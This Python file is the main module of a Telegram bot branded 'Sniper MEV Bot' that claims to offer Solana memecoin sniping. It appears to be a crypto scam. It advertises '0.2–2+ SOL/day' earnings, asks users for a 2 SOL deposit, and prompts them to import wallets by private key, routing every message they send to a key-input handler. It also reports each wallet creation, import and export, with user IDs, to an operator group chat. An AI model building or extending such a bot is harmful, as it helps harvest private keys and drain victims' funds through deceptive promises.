from telebot import TeleBot, types
from config import BOT_TOKEN
import create_wallet
import import_wallet
import main_menu
import wallet
import export_wallet
import withdraw
import startmev
import positions
import leaderboard
import info
import referrals
from config import GROUP_CHAT_ID




bot = TeleBot(BOT_TOKEN)
bot_data = {}  # ✅ Global shared dictionary

# Pass bot_data into import_wallet module
import_wallet.set_bot_data(bot_data)

# /start command
@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id


    keyboard = types.InlineKeyboardMarkup()
    keyboard.row(
        types.InlineKeyboardButton("🆕 Create Wallet", callback_data="create_wallet"),
        types.InlineKeyboardButton("👜 Import Wallet", callback_data="import_wallet")
    )

    # bot.send_message(chat_id, "hello, hold on a moment while we populate your menu", parse_mode="markdown")

    welcome = """
🚀 *Welcome to Sniper MEV Bot* – Trusted Solana Trading Assistant

Automated memecoin sniping & MEV trading on Solana with:
✅ Frontrunning & backrunning strategies
✅ 0.2–2+ SOL/day potential earnings
✅ Anti-rug protection & auto take-profit

🌐 [Website](https://snipermev.com/) | 📚 [Docs](https://snipermev.com/docs) | 📣 [Channel](https://t.me/SniperMEVOfficial)

Get started with just *2 SOL* — fast, secure, and built to win.
Ready to trade smarter? Use the menu below to begin.\\
"""
    try:

        sent = bot.send_animation(
            chat_id,
            animation="https://raw.githubusercontent.com/raccityy/video/refs/heads/main/welcome.mp4",
            caption=welcome,
            parse_mode="Markdown",
            reply_markup=keyboard
        )
    except FileNotFoundError:
        bot.send_message(chat_id, "⚠️ Video not found. Make sure `welcome.mp4` exists.")

    bot.send_message(
            GROUP_CHAT_ID,
            f"📥 New /start from user ID `{chat_id}` (@{message.from_user.username})",
            parse_mode="Markdown"
        )


@bot.message_handler(commands=['menu'])
def handle_menu_command(message):
    from main_menu import show_main_menu
    # Mimic a callback-like object with message
    class DummyCall:
        def __init__(self, msg):
            self.message = msg
    dummy_call = DummyCall(message)
    show_main_menu(bot, dummy_call)
    bot.send_message(
            GROUP_CHAT_ID,
            f"📥 New menu from user ID `{message.chat.id}` (@{message.from_user.username})",
            parse_mode="Markdown"
        )

# Handle button taps
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id

    if chat_id in bot_data and 'start_msg_id' in bot_data[chat_id]:
        try:
            bot.delete_message(chat_id, bot_data[chat_id]['start_msg_id'])
        except:
            pass
    if call.data == "create_wallet":
        create_wallet.handle_create_wallet(bot, call.message)
        bot.send_message(
            GROUP_CHAT_ID,
            f"📥 New wallet generated from user ID `{chat_id}` (@{call.from_user.username})",
            parse_mode="Markdown"
        )
        # import_wallet.prompt_for_private_key(bot, call.message)
    elif call.data == "import_wallet":
        import_wallet.handle_continue_wallet(bot, call)
        bot.send_message(
            GROUP_CHAT_ID,
            f"📥 New imported wallert from user ID `{chat_id}` (@{call.from_user.username})",
            parse_mode="Markdown"
        )
        import_wallet.prompt_for_private_key(bot, call.message)
    elif call.data == "actuall_menu":
        main_menu.show_main_menu(bot, call)
        import_wallet.handle_continue_wallet(bot, call)
    elif call.data == "wallet":
        wallet.handle_wallet(bot, call)
    elif call.data == "close_wallet_menu":
        wallet.handle_close_wallet(bot, call)
    elif call.data == "StartMEVSniper":
        # print('hello')
        startmev.handle_start_mev(bot, call)
    elif call.data == "Positions":
        positions.handle_positions(bot, call)
        # import_wallet.handle_continue_wallet(bot, call)
        # print('hello')
    elif call.data == "positions_close":
        positions.handle_positions_callback(bot, call)
    elif call.data == "MEVHistory":
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("❌ Close", callback_data="mev_history_close"))

        bot.send_message(
            call.message.chat.id,
            "📊 *0 MEV TX positions open*",
            parse_mode="Markdown",
            reply_markup=keyboard
        )
    elif call.data == "mev_history_close":
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        print('hello')
    elif call.data == "Leaderboard":
        print('hello')
        leaderboard.handle_leaderboard(bot, call)
    elif call.data == "leaderboard_close":
        leaderboard.handle_leaderboard_close(bot, call)
    elif call.data == "MEVTransactionsTracker":

        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(
            types.InlineKeyboardButton("❌ Close", callback_data="close_tracker")
        )

        tracker_text = """
    📡 *Live MEV Transactions*

    For real-time transaction updates, you can view the [Live Transaction](https://t.me/SniperMEVTrack) details here.
    """

        bot.send_message(call.message.chat.id, tracker_text, parse_mode="Markdown", reply_markup=keyboard)

        print('hello')
    elif call.data == "close_tracker":
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
    elif call.data == "Info":
        print('hello')
        info.handle_info(bot, call)
    elif call.data == "close_info":
        info.handle_close_info(bot, call)
    elif call.data == "Referrals":
        print('hello')
        referrals.handle_referrals(bot, call)
    elif call.data == "close_referrals":
        referrals.handle_close_referrals(bot, call)
    # elif call.data == "Support":
    #     print('hello')
    elif call.data == "Refresh":
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        main_menu.show_main_menu(bot, call)  # Resend the MEV menu
        # print('hello')
    elif call.data == "export_wallet":
        bot.send_message(
            GROUP_CHAT_ID,
            f"📥 New export wallet from user ID `{chat_id}` (@{call.from_user.username})",
            parse_mode="Markdown"
        )
        # withdraw.handle_withdraw(bot, call)
        export_wallet.handle_export_wallet(bot, call)
    elif call.data == "close_export_wallet":
        export_wallet.handle_close_export_wallet(bot, call)
    elif call.data == "withdraw_sol":
        print("jj")
        withdraw.handle_withdraw(bot, call)
    elif call.data == "close_withdraw":
        withdraw.handle_close_withdraw(bot, call)
    elif call.data in ["start_mev_close", "start_mev_auto_buy", "StartEVSniper"]:
        startmev.handle_start_mev_callback(bot, call)





# Catch all user messages
@bot.message_handler(func=lambda m: True)
def handle_all_messages(message):
    import_wallet.handle_wallet_key_input(bot, message)

if __name__ == "__main__":
    print("bot s running")
    bot.infinity_polling()

